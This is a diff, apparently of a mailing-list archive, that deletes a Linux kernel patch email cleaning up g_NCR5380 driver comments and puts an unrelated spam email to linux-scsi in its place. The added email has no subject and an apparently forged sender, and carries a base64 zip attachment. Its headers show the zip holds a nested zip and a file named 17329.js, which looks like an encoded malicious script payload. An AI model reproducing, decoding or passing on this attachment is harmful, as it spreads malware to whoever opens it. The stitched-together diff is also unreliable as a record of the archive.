@@ -1,168 +1,113 @@
-From: Finn Thain <fthain@telegraphics.com.au>
-Subject: [PATCH 4/4] g_NCR5380: Cleanup comments and whitespace
-Date: Thu, 15 Jun 2017 08:17:56 -0400 (EDT)
-Message-ID: <54fac2a20d0e224f683b84f47b4165e7fbbff385.1497528687.git.fthain@telegraphics.com.au>
-References: <cover.1497528687.git.fthain@telegraphics.com.au>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <cover.1497528687.git.fthain@telegraphics.com.au>
-Sender: linux-kernel-owner@vger.kernel.org
-To: "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, "Martin K. Petersen" <martin.petersen@oracle.com>, Ondrej Zary <linux@rainbow-software.org>
-Cc: linux-scsi@vger.kernel.org, linux-kernel@vger.kernel.org, Michael Schmitz <schmitzmic@gmail.com>
+From: <john.dahlberg@landshypotek.se>
+Subject: (unknown)
+Date: Thu, 15 Jun 2017 14:56:19 -0000
+Message-ID: <149753857921.19456.12600971789639740843@asianet.co.th>
+Mime-Version: 1.0
+Content-Type: application/zip; name="104973915087041.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from ppp-210-86-175-130.revip.asianet.co.th ([210.86.175.130]:46855
+        "HELO asianet.co.th" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751755AbdFOO4X (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>); Thu, 15 Jun 2017 10:56:23 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-Signed-off-by: Finn Thain <fthain@telegraphics.com.au>
----
- drivers/scsi/g_NCR5380.c | 61 ++++++++++++++++++++++--------------------------
- 1 file changed, 28 insertions(+), 33 deletions(-)
-
-diff --git a/drivers/scsi/g_NCR5380.c b/drivers/scsi/g_NCR5380.c
-index 784913193ea5..e9a942d86865 100644
---- a/drivers/scsi/g_NCR5380.c
-+++ b/drivers/scsi/g_NCR5380.c
-@@ -1,17 +1,17 @@
- /*
-  * Generic Generic NCR5380 driver
-- *	
-+ *
-  * Copyright 1993, Drew Eckhardt
-- *	Visionary Computing
-- *	(Unix and Linux consulting and custom programming)
-- *	drew@colorado.edu
-- *      +1 (303) 440-4894
-+ * Visionary Computing
-+ * (Unix and Linux consulting and custom programming)
-+ * drew@colorado.edu
-+ * +1 (303) 440-4894
-  *
-  * NCR53C400 extensions (c) 1994,1995,1996, Kevin Lentin
-- *    K.Lentin@cs.monash.edu.au
-+ * K.Lentin@cs.monash.edu.au
-  *
-  * NCR53C400A extensions (c) 1996, Ingmar Baumgart
-- *    ingmar@gonzo.schwaben.de
-+ * ingmar@gonzo.schwaben.de
-  *
-  * DTC3181E extensions (c) 1997, Ronald van Cuijlenborg
-  * ronald.van.cuijlenborg@tip.nl or nutty@dds.nl
-@@ -482,15 +482,14 @@ static void generic_NCR5380_release_resources(struct Scsi_Host *instance)
- }
- 
- /**
-- *	generic_NCR5380_pread - pseudo DMA read
-- *	@hostdata: scsi host private data
-- *	@dst: buffer to read into
-- *	@len: buffer length
-+ * generic_NCR5380_pread - pseudo DMA receive
-+ * @hostdata: scsi host private data
-+ * @dst: buffer to write into
-+ * @len: transfer size
-  *
-- *	Perform a pseudo DMA mode read from an NCR53C400 or equivalent
-- *	controller
-+ * Perform a pseudo DMA mode receive from a 53C400 or equivalent device.
-  */
-- 
-+
- static inline int generic_NCR5380_pread(struct NCR5380_hostdata *hostdata,
-                                         unsigned char *dst, int len)
- {
-@@ -509,10 +508,10 @@ static inline int generic_NCR5380_pread(struct NCR5380_hostdata *hostdata,
- 
- 		if (hostdata->io_port && hostdata->io_width == 2)
- 			insw(hostdata->io_port + hostdata->c400_host_buf,
--							dst + start, 64);
-+			     dst + start, 64);
- 		else if (hostdata->io_port)
- 			insb(hostdata->io_port + hostdata->c400_host_buf,
--							dst + start, 128);
-+			     dst + start, 128);
- 		else
- 			memcpy_fromio(dst + start,
- 				hostdata->io + NCR53C400_host_buffer, 128);
-@@ -556,13 +555,12 @@ static inline int generic_NCR5380_pread(struct NCR5380_hostdata *hostdata,
- }
- 
- /**
-- *	generic_NCR5380_pwrite - pseudo DMA write
-- *	@hostdata: scsi host private data
-- *	@dst: buffer to read into
-- *	@len: buffer length
-+ * generic_NCR5380_pwrite - pseudo DMA send
-+ * @hostdata: scsi host private data
-+ * @src: buffer to read from
-+ * @len: transfer size
-  *
-- *	Perform a pseudo DMA mode read from an NCR53C400 or equivalent
-- *	controller
-+ * Perform a pseudo DMA mode send to a 53C400 or equivalent device.
-  */
- 
- static inline int generic_NCR5380_pwrite(struct NCR5380_hostdata *hostdata,
-@@ -601,10 +599,10 @@ static inline int generic_NCR5380_pwrite(struct NCR5380_hostdata *hostdata,
- 
- 		if (hostdata->io_port && hostdata->io_width == 2)
- 			outsw(hostdata->io_port + hostdata->c400_host_buf,
--							src + start, 64);
-+			      src + start, 64);
- 		else if (hostdata->io_port)
- 			outsb(hostdata->io_port + hostdata->c400_host_buf,
--							src + start, 128);
-+			      src + start, 128);
- 		else
- 			memcpy_toio(hostdata->io + NCR53C400_host_buffer,
- 			            src + start, 128);
-@@ -650,10 +648,8 @@ static int generic_NCR5380_dma_residual(struct NCR5380_hostdata *hostdata)
- 	return hostdata->pdma_residual;
- }
- 
--/*
-- *	Include the NCR5380 core code that we build our driver around	
-- */
-- 
-+/* Include the core driver code. */
-+
- #include "NCR5380.c"
- 
- static struct scsi_host_template driver_template = {
-@@ -673,11 +669,10 @@ static struct scsi_host_template driver_template = {
- 	.max_sectors		= 128,
- };
- 
--
- static int generic_NCR5380_isa_match(struct device *pdev, unsigned int ndev)
- {
- 	int ret = generic_NCR5380_init_one(&driver_template, pdev, base[ndev],
--					  irq[ndev], card[ndev]);
-+	                                   irq[ndev], card[ndev]);
- 	if (ret) {
- 		if (base[ndev])
- 			printk(KERN_WARNING "Card not found at address 0x%03x\n",
-@@ -689,7 +684,7 @@ static int generic_NCR5380_isa_match(struct device *pdev, unsigned int ndev)
- }
- 
- static int generic_NCR5380_isa_remove(struct device *pdev,
--				   unsigned int ndev)
-+                                      unsigned int ndev)
- {
- 	generic_NCR5380_release_resources(dev_get_drvdata(pdev));
- 	dev_set_drvdata(pdev, NULL);
-@@ -712,7 +707,7 @@ static struct pnp_device_id generic_NCR5380_pnp_ids[] = {
- MODULE_DEVICE_TABLE(pnp, generic_NCR5380_pnp_ids);
- 
- static int generic_NCR5380_pnp_probe(struct pnp_dev *pdev,
--			       const struct pnp_device_id *id)
-+                                     const struct pnp_device_id *id)
- {
- 	int base, irq;
- 
-@@ -723,7 +718,7 @@ static int generic_NCR5380_pnp_probe(struct pnp_dev *pdev,
- 	irq = pnp_irq(pdev, 0);
- 
- 	return generic_NCR5380_init_one(&driver_template, &pdev->dev, base, irq,
--				       id->driver_data);
-+	                                id->driver_data);
- }
- 
- static void generic_NCR5380_pnp_remove(struct pnp_dev *pdev)
--- 
-2.13.0
+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
